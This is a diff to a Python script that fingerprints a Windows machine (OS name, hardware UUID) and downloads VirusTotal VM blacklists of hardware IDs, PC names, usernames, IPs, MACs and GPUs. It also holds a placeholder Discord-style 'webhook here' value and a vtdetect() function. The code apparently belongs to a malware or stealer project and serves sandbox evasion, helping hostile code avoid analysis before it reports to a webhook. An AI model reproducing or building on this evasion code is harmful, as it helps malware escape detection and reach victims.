@@ -26,13 +26,13 @@ os_info = computer.Win32_OperatingSystem()[0]
 os_name = os_info.Name.encode('utf-8').split(b'|')[0]
 currentplat = os_name
 hwid = subprocess.check_output('wmic csproduct get uuid').decode().split('\n')[1].strip()
-hwidlist = requests.get('https://raw.githubusercontent.com/KAMKAZEMARCI/virustotal-vm-blacklist/main/hwid_list.txt')
-pcnamelist = requests.get('https://raw.githubusercontent.com/KAMKAZEMARCI/virustotal-vm-blacklist/main/pc_name_list.txt')
-pcusernamelist = requests.get('https://raw.githubusercontent.com/KAMKAZEMARCI/virustotal-vm-blacklist/main/pc_username_list.txt')
-iplist = requests.get('https://raw.githubusercontent.com/KAMKAZEMARCI/virustotal-vm-blacklist/main/ip_list.txt')
-maclist = requests.get('https://raw.githubusercontent.com/KAMKAZEMARCI/virustotal-vm-blacklist/main/mac_list.txt')
-gpulist = requests.get('https://raw.githubusercontent.com/KAMKAZEMARCI/virustotal-vm-blacklist/main/gpu_list.txt')
-platformlist = requests.get('https://raw.githubusercontent.com/KAMKAZEMARCI/virustotal-vm-blacklist/main/pc_platforms.txt')
+hwidlist = requests.get('https://raw.githubusercontent.com/6nz/virustotal-vm-blacklist/main/hwid_list.txt')
+pcnamelist = requests.get('https://raw.githubusercontent.com/6nz/virustotal-vm-blacklist/main/pc_name_list.txt')
+pcusernamelist = requests.get('https://raw.githubusercontent.com/6nz/virustotal-vm-blacklist/main/pc_username_list.txt')
+iplist = requests.get('https://raw.githubusercontent.com/6nz/virustotal-vm-blacklist/main/ip_list.txt')
+maclist = requests.get('https://raw.githubusercontent.com/6nz/virustotal-vm-blacklist/main/mac_list.txt')
+gpulist = requests.get('https://raw.githubusercontent.com/6nz/virustotal-vm-blacklist/main/gpu_list.txt')
+platformlist = requests.get('https://raw.githubusercontent.com/6nz/virustotal-vm-blacklist/main/pc_platforms.txt')
 api = "webhook here"
 
 def vtdetect():
